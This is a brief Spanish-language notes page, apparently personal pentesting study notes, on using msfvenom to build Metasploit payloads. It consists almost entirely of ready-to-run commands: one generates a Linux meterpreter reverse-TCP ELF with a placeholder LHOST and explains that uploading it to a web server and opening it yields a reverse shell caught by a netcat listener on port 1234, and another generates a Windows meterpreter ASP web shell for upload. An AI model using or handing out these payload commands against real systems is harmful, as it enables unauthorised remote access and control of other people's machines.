# Msfvenom

Propietario: Adrian Gisbert Cabello

Comandos para usar en msfvenom (Payloads):

- Para generar un payload: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.X.X LPORT=1234 -f elf > hola.elf`. Si subimos el archivo hola.elf al servidor http y accedemos a él a través del navegador, obendremos una revershell si nos ponemos en escucha con netcat a través del puerto 1234 `nc -lvnp 1234`
- Para generar un payload para windows: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.X.X LPORT=1234 -f asp > shell.asp`